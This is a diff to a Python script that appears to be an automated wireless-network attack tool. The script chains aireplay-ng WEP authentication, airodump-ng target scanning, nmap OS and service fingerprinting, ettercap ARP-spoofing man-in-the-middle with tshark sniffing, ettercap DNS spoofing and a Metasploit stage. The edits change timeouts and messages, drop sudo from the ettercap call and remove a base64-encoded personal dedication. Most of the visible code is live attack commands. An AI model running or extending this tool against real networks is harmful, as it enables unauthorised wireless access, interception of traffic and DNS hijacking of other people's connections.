@@ -12,7 +12,7 @@
   Licensed under the GNU General Public License Version 2 (GNU GPL v2),
         available at: http://www.gnu.org/licenses/gpl-2.0.txt
   
-  S2l3aSAoQS5WLkMpIGdyYWNpYXMgcG9yIGVuc2XDsWFybWUgbG8gbcOhcyBsaW5kbyBkZSBsYSB2aWRhLiBOdW5jYSB0ZSB2b3kgYSBvbHZpZGFyLi4u=
+ --
 -------------------------------------------------------------------------
 
 """
@@ -176,7 +176,7 @@ def WEP_attack(essid,bssid,channel,new_mac,iface_mon):
 
 	cmd_auth = pexpect.spawn('aireplay-ng -1 0 -e "{0}" -a {1} -h {2} {3}'.format(essid,bssid,new_mac,iface_mon))
 	cmd_auth.logfile = file(LOG_FILE,'w')
-	cmd_auth.expect(['Association successful',pexpect.TIMEOUT,pexpect.EOF],25)
+	cmd_auth.expect(['Association successful',pexpect.TIMEOUT,pexpect.EOF],20)
 	cmd_auth.close()
 	parse_log_auth = open(LOG_FILE,'r')
 	for line in parse_log_auth:
@@ -221,7 +221,7 @@ def scan_targets(iface_mon,essid_predefined):
 		os.remove(OS_PATH+'/cr0z0n0-01.kismet.csv')
 		os.remove(OS_PATH+'/cr0z0n0-01.kismet.netxml')
 	cmd_airodump = pexpect.spawn('airodump-ng -w cr0z0n0 {0}'.format(iface_mon))
-	time.sleep(10)
+	time.sleep(20) #change time
 	cmd_airodump.close()
 
 	csv = open(OS_PATH+'/cr0z0n0-01.csv', 'r')
@@ -261,7 +261,7 @@ def scan_targets(iface_mon,essid_predefined):
 				data = line.split(',')
 				target = [data[0],data[3],data[5],data[6],data[7],data[8],data[9],data[13]]	
 		if target_found == False:
-			print("  [x] Target not found!")
+			print("  [-] Target not found!")
 			exit()
 	return target		
 
@@ -281,6 +281,9 @@ def enable_mode_monitor(iface):
 		if line.find('Mode:Monitor') != -1:
 			iface_mon = line.split()[0]
 			return iface_mon
+		else:
+			print("  [-] Could not find interface in mode monitor!")
+			exit()
 
 def get_gateway():
 	gateway = []
@@ -451,7 +454,7 @@ def main():
 		print("  [+] Executing Nmap...")
 		call(['nmap', '-O', '-sV', '-oN', 'cr0z0n0_nmap', '--exclude', ip_lan, range_net], stderr=DN)
 	else:
-		print("  [-] Error! attacker not defined!")
+		print("  [-] Attacker not defined! Ending...")
 		exit()
 
 	if attack_predefined == 'sniffing-mitm':
@@ -459,7 +462,7 @@ def main():
 		gateway = get_gateway().strip()
 		target_mitm = get_target_mitm(gateway,ip_lan)
 		print("  [+] Executing MITM and Sniffing attacks between "+gateway+" and "+target_mitm+"...")
-		cmd_ettercap = pexpect.spawn('sudo ettercap -T -M arp:remote /{0}/ /{1}/ -i {2}'.format(gateway,target_mitm,iface))
+		cmd_ettercap = pexpect.spawn('ettercap -T -M arp:remote /{0}/ /{1}/ -i {2}'.format(gateway,target_mitm,iface))
 		time.sleep(2)
 		#cmd_tshark = pexpect.spawn('tshark -i {0} -w cr0z0n0_sniff'.format(iface))		
 		proc = subprocess.call(["tshark", "-i", iface], stderr=DN)
@@ -496,7 +499,7 @@ def main():
 		gateway = get_gateway().strip()
 		target_mitm = get_target_mitm(gateway,ip_lan)
 		cmd_ettercap = pexpect.spawn('ettercap -T -M arp:remote /{0}/ /{1}/ -i {2} -P dns_spoof'.format(gateway,target_mitm,iface))
-		time.sleep(180) #change time
+		time.sleep(300) #change time
 
 	elif attack_predefined == 'metasploit':
 		print("  [+] Executing Metasploit...")
